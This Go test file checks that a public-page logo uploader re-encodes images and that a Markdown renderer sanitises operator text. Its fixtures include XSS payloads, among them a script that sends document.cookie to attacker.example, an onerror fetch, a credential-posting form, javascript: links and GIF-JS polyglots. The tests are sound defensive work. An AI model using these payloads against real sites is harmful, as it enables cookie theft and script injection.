package publicview

import (
	"bytes"
	"errors"
	"image"
	"image/color"
	"image/jpeg"
	"image/png"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// ---------------------------------------------------------------------------
// Fixtures
// ---------------------------------------------------------------------------

func testPNG(t *testing.T, w, h int) []byte {
	t.Helper()
	img := image.NewRGBA(image.Rect(0, 0, w, h))
	for y := range h {
		for x := range w {
			img.Set(x, y, color.RGBA{uint8(x), uint8(y), 0x40, 0xff})
		}
	}
	var buf bytes.Buffer
	if err := png.Encode(&buf, img); err != nil {
		t.Fatal(err)
	}
	return buf.Bytes()
}

func testJPEG(t *testing.T, w, h int) []byte {
	t.Helper()
	img := image.NewRGBA(image.Rect(0, 0, w, h))
	for y := range h {
		for x := range w {
			img.Set(x, y, color.RGBA{uint8(x * 3), uint8(y * 3), 0x80, 0xff})
		}
	}
	var buf bytes.Buffer
	if err := jpeg.Encode(&buf, img, &jpeg.Options{Quality: 90}); err != nil {
		t.Fatal(err)
	}
	return buf.Bytes()
}

// jpegWithMetadata splices an APP1 segment carrying the payload into a JPEG,
// immediately after the SOI marker — which is exactly where a camera writes the
// EXIF block that holds GPS coordinates.
//
// The payload is not byte-perfect EXIF, and it does not need to be: what is under
// test is that metadata segments do not survive a decode-and-re-encode, and a
// well-formed APP1 segment is the thing that either survives or does not. Go's
// JPEG decoder skips APP segments it does not understand, so the image still
// decodes, which is what makes this a real test of the re-encode rather than of
// the decoder rejecting a malformed file.
func jpegWithMetadata(t *testing.T, payload []byte) []byte {
	t.Helper()
	base := testJPEG(t, 64, 64)
	if base[0] != 0xFF || base[1] != 0xD8 {
		t.Fatal("fixture JPEG does not start with SOI")
	}
	seg := append([]byte("Exif\x00\x00"), payload...)
	length := len(seg) + 2 // the length field counts itself
	app1 := []byte{0xFF, 0xE1, byte(length >> 8), byte(length & 0xff)}
	app1 = append(app1, seg...)

	out := make([]byte, 0, len(base)+len(app1))
	out = append(out, base[:2]...) // SOI
	out = append(out, app1...)     // APP1 with the metadata
	out = append(out, base[2:]...) // the rest of the image
	return out
}

func storeAndRead(t *testing.T, data []byte) ([]byte, error) {
	t.Helper()
	dir := t.TempDir()
	rel, err := StoreLogo(dir, bytes.NewReader(data))
	if err != nil {
		return nil, err
	}
	if rel != LogoRelPath {
		t.Errorf("StoreLogo returned %q, want %q", rel, LogoRelPath)
	}
	out, err := os.ReadFile(filepath.Join(dir, filepath.FromSlash(rel)))
	if err != nil {
		t.Fatal(err)
	}
	return out, nil
}

// ---------------------------------------------------------------------------
// Logo: what the re-encode is for
// ---------------------------------------------------------------------------

// TestLogoStripsMetadata is the EXIF case, and the reason it matters is not
// abstract: an operator photographs their tower with a phone and uploads it, and
// the phone wrote the coordinates into the file. They will not think to check, and
// the whole public surface is built around not disclosing where they are.
func TestLogoStripsMetadata(t *testing.T) {
	secret := []byte("GPSLatitude=30.6320 GPSLongitude=-87.0400 Make=SecretCamera")
	in := jpegWithMetadata(t, secret)
	if !bytes.Contains(in, secret) {
		t.Fatal("the fixture does not contain the metadata it is supposed to")
	}

	out, err := storeAndRead(t, in)
	if err != nil {
		t.Fatalf("a JPEG carrying EXIF was rejected outright: %v", err)
	}
	if bytes.Contains(out, secret) {
		t.Error("the served logo still carries the uploaded metadata — the re-encode did not strip it")
	}
	for _, frag := range [][]byte{[]byte("GPSLatitude"), []byte("GPSLongitude"), []byte("Exif"), []byte("SecretCamera")} {
		if bytes.Contains(out, frag) {
			t.Errorf("the served logo still contains %q", frag)
		}
	}
	// And it is a real PNG afterwards, not merely different bytes.
	if _, err := png.Decode(bytes.NewReader(out)); err != nil {
		t.Errorf("the re-encoded logo is not a valid PNG: %v", err)
	}
}

// TestLogoStripsTrailingPayload is the polyglot case. A file can be a valid image
// and something else at the same time — bytes after a PNG's IEND are ignored by
// every decoder and preserved by every naive copy. Re-encoding from decoded pixels
// is what makes that impossible rather than merely unlikely.
func TestLogoStripsTrailingPayload(t *testing.T) {
	payload := []byte("\n<script>fetch('https://attacker.example/'+document.cookie)</script>\n")
	in := append(testPNG(t, 48, 48), payload...)

	out, err := storeAndRead(t, in)
	if err != nil {
		t.Fatalf("a PNG with trailing bytes was rejected: %v", err)
	}
	if bytes.Contains(out, payload) {
		t.Error("the appended payload survived into the served file")
	}
	if bytes.Contains(out, []byte("<script")) || bytes.Contains(out, []byte("attacker.example")) {
		t.Error("script content survived the re-encode")
	}
}

// TestLogoRejectsNonRaster covers D4's "SVG rejected" and everything else that is
// not one of the two permitted formats. The GIF-JS polyglot is the classic
// crafted file: valid GIF header, valid JavaScript, and it never reaches the
// re-encode because GIF is not a registered decoder here.
func TestLogoRejectsNonRaster(t *testing.T) {
	for _, tc := range []struct {
		name string
		data []byte
	}{
		{"svg", []byte(`<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>`)},
		{"svg with xml prologue", []byte(`<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg"/>`)},
		{"gif-js polyglot", []byte("GIF89a/*\x00\x00\x00\x00;*/=1;alert(1);//")},
		{"html", []byte("<!doctype html><script>alert(1)</script>")},
		{"plain text", []byte("this is not an image")},
		{"empty", nil},
		{"png magic only", []byte("\x89PNG\r\n\x1a\n")},
	} {
		t.Run(tc.name, func(t *testing.T) {
			_, err := StoreLogo(t.TempDir(), bytes.NewReader(tc.data))
			if !errors.Is(err, ErrLogoFormat) {
				t.Errorf("StoreLogo(%s) = %v, want ErrLogoFormat", tc.name, err)
			}
		})
	}
}

func TestLogoAcceptsPNGAndJPEG(t *testing.T) {
	for _, tc := range []struct {
		name string
		data []byte
	}{
		{"png", testPNG(t, 64, 64)},
		{"jpeg", testJPEG(t, 64, 64)},
	} {
		t.Run(tc.name, func(t *testing.T) {
			out, err := storeAndRead(t, tc.data)
			if err != nil {
				t.Fatalf("StoreLogo(%s): %v", tc.name, err)
			}
			// Whatever went in, a PNG comes out — so the served Content-Type is a
			// fact about the file rather than a claim about it.
			if _, err := png.Decode(bytes.NewReader(out)); err != nil {
				t.Errorf("%s was not re-encoded to PNG: %v", tc.name, err)
			}
		})
	}
}

func TestLogoRejectsOversize(t *testing.T) {
	big := make([]byte, LogoMaxBytes+1)
	copy(big, testPNG(t, 8, 8))
	if _, err := StoreLogo(t.TempDir(), bytes.NewReader(big)); !errors.Is(err, ErrLogoTooLarge) {
		t.Errorf("an oversized upload = %v, want ErrLogoTooLarge", err)
	}
}

// TestLogoRejectsDecompressionBomb is a separate guard from the byte ceiling, and
// the reason is the compression ratio: PNG is deflate, so a file well under a
// megabyte on the wire can be tens of thousands of pixels square once decoded —
// hundreds of megabytes of RAM on a Pi with a gigabyte of it.
func TestLogoRejectsDecompressionBomb(t *testing.T) {
	// A large single-colour image compresses to almost nothing.
	img := image.NewRGBA(image.Rect(0, 0, logoMaxDimension+1, 64))
	var buf bytes.Buffer
	if err := png.Encode(&buf, img); err != nil {
		t.Fatal(err)
	}
	if buf.Len() > LogoMaxBytes {
		t.Fatalf("fixture is %d bytes, too big to isolate the dimension check", buf.Len())
	}
	if _, err := StoreLogo(t.TempDir(), bytes.NewReader(buf.Bytes())); !errors.Is(err, ErrLogoDimension) {
		t.Errorf("an oversized-dimension PNG = %v, want ErrLogoDimension", err)
	}
}

// TestLogoWriteIsAtomic: a failed write must leave the previous logo in place
// rather than a truncated one, and no .tmp file behind.
func TestLogoReplacesCleanly(t *testing.T) {
	dir := t.TempDir()
	if _, err := StoreLogo(dir, bytes.NewReader(testPNG(t, 32, 32))); err != nil {
		t.Fatal(err)
	}
	if _, err := StoreLogo(dir, bytes.NewReader(testJPEG(t, 48, 48))); err != nil {
		t.Fatal(err)
	}
	entries, err := os.ReadDir(filepath.Join(dir, "branding"))
	if err != nil {
		t.Fatal(err)
	}
	for _, e := range entries {
		if strings.HasSuffix(e.Name(), ".tmp") {
			t.Errorf("a temporary file was left behind: %s", e.Name())
		}
	}
	if len(entries) != 1 {
		t.Errorf("branding dir holds %d files, want 1", len(entries))
	}
}

// ---------------------------------------------------------------------------
// Narrative: hostile Markdown
// ---------------------------------------------------------------------------

// TestNarrativeNeutersHostileMarkdown. Every case here is something an operator
// could paste in, deliberately or from somewhere else, and none of it may reach a
// visitor's browser as anything executable.
func TestNarrativeNeutersHostileMarkdown(t *testing.T) {
	for _, tc := range []struct {
		name   string
		src    string
		absent []string
	}{
		{
			"raw script tag",
			"# K4SRC\n\n<script>alert(document.domain)</script>\n",
			[]string{"<script", "alert("},
		},
		{
			"event handler on raw html",
			`<img src=x onerror="fetch('https://attacker.example')">`,
			[]string{"onerror", "attacker.example"},
		},
		{
			"javascript: link",
			"[click me](javascript:alert(1))",
			[]string{"javascript:"},
		},
		{
			"data: uri link",
			"[click me](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)",
			[]string{"data:text/html"},
		},
		{
			"image with javascript source",
			"![x](javascript:alert(1))",
			[]string{"javascript:"},
		},
		{
			"iframe",
			"<iframe src=\"https://attacker.example\"></iframe>",
			[]string{"<iframe", "attacker.example"},
		},
		{
			"style block",
			"<style>body{display:none}</style>",
			[]string{"<style"},
		},
		{
			"object and embed",
			`<object data="x.swf"></object><embed src="x.swf">`,
			[]string{"<object", "<embed"},
		},
		{
			// Inline raw HTML is escaped by the renderer rather than dropped, so the
			// literal text "alert(1)" survives as VISIBLE TEXT. That is correct and
			// is what an operator who typed it should see; what must not survive is
			// an executable tag, which is what is asserted.
			"svg with script",
			`<svg><script>alert(1)</script></svg>`,
			[]string{"<script", "<svg"},
		},
		{
			"form posting elsewhere",
			`<form action="https://attacker.example"><input name="p" type="password"></form>`,
			[]string{"<form", "<input", "attacker.example"},
		},
	} {
		t.Run(tc.name, func(t *testing.T) {
			got, err := RenderNarrative(tc.src)
			if err != nil {
				t.Fatal(err)
			}
			low := strings.ToLower(got)
			for _, bad := range tc.absent {
				if strings.Contains(low, strings.ToLower(bad)) {
					t.Errorf("rendered narrative still contains %q:\n%s", bad, got)
				}
			}
		})
	}
}

// TestNarrativeKeepsOrdinaryFormatting: the sanitiser has to leave the feature
// usable, or operators will ask for the custom-HTML block instead and get a worse
// deal.
func TestNarrativeKeepsOrdinaryFormatting(t *testing.T) {
	src := "# Santa Rosa County ARC\n\n" +
		"K4SRC is **open** to all licensed amateurs — no _membership_ needed.\n\n" +
		"- Weekly net Mondays\n- Visitors first\n\n" +
		"See the [club site](https://example.org) for details.\n\n" +
		"| Slot | TG |\n| --- | --- |\n| TS2 | 31123 |\n"
	got, err := RenderNarrative(src)
	if err != nil {
		t.Fatal(err)
	}
	for _, want := range []string{
		"<h1", "Santa Rosa County ARC", "<strong>open</strong>", "<em>membership</em>",
		"<ul>", "<li>", "<table>", "<td>", "https://example.org",
	} {
		if !strings.Contains(got, want) {
			t.Errorf("rendered narrative lost %q:\n%s", want, got)
		}
	}
	// Outbound links get the treatment any outbound link gets.
	for _, want := range []string{`rel="`, "nofollow", "noreferrer"} {
		if !strings.Contains(got, want) {
			t.Errorf("rendered link is missing %q:\n%s", want, got)
		}
	}
}

func TestNarrativeEmptyRendersEmpty(t *testing.T) {
	got, err := RenderNarrative("")
	if err != nil {
		t.Fatal(err)
	}
	if got != "" {
		t.Errorf("empty narrative rendered to %q, want empty so the page omits the block", got)
	}
}

// TestNarrativeStoredSourceIsUntouched. Sanitising on the way in would corrupt the
// text the operator edits next; the store keeps what they typed and the render
// path decides what is served.
func TestNarrativeStoredSourceIsUntouched(t *testing.T) {
	ps := newTestStore(t)
	src := "# K4SRC\n\n<script>alert(1)</script>\n\nStill here."
	if err := ps.SaveBranding(Branding{NarrativeMarkdown: src}); err != nil {
		t.Fatal(err)
	}
	b, err := ps.Branding()
	if err != nil {
		t.Fatal(err)
	}
	if b.NarrativeMarkdown != src {
		t.Errorf("the store rewrote the operator's Markdown:\n got: %q\nwant: %q", b.NarrativeMarkdown, src)
	}
	html, err := RenderNarrative(b.NarrativeMarkdown)
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(html, "<script") {
		t.Error("the rendered output carries the script the source kept")
	}
	if !strings.Contains(html, "Still here.") {
		t.Error("sanitising removed the operator's actual prose")
	}
}

// TestNarrativeKeepsTextDropsTags pins what actually happens to inline markup an
// operator typed, because it is worth being precise about rather than assuming.
//
// Two passes run. goldmark has raw HTML disabled, so it escapes the markup into
// entities; bluemonday then parses those entities back, drops the elements it does
// not allow, and keeps their text content. The result is that "alert(1)" survives
// as VISIBLE TEXT while <script> and <svg> do not survive as tags.
//
// So a page may legitimately display the characters "alert(1)" — that is what the
// operator wrote — with nothing executable in the DOM. Asserting the absence of
// the string "alert(" would therefore be testing the wrong property, and would
// fail on a narrative that merely discusses JavaScript.
func TestNarrativeKeepsTextDropsTags(t *testing.T) {
	got, err := RenderNarrative(`Try <svg><script>alert(1)</script></svg> in your browser.`)
	if err != nil {
		t.Fatal(err)
	}
	for _, tag := range []string{"<script", "<svg", "&lt;script", "&lt;svg"} {
		if strings.Contains(got, tag) {
			t.Errorf("markup survived as %q:\n%s", tag, got)
		}
	}
	if !strings.Contains(got, "Try ") || !strings.Contains(got, "in your browser.") {
		t.Errorf("the operator's surrounding prose was lost:\n%s", got)
	}
	if !strings.Contains(got, "alert(1)") {
		t.Errorf("the text content was dropped as well as the tags, which loses what was written:\n%s", got)
	}
}
